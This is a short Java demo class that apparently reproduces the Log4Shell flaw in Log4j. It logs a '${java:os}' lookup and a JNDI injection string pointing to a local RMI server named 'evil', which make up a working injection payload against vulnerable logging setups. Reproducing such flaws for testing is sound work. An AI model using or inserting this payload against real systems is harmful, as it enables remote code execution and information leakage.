package com.example.bug;

import lombok.extern.slf4j.Slf4j;

/**
 * @author shichao
 * @since 2021/12/11 12:09
 **/
@Slf4j
public class UserApplication {
    public static void main(String[] args) {
        log.error("Begin");

        String username = "${java:os}";
        log.info("{}", username);

        username = "${jndi:rmi://127.0.0.1:2002/evil}";
        log.info(username);
    }
}
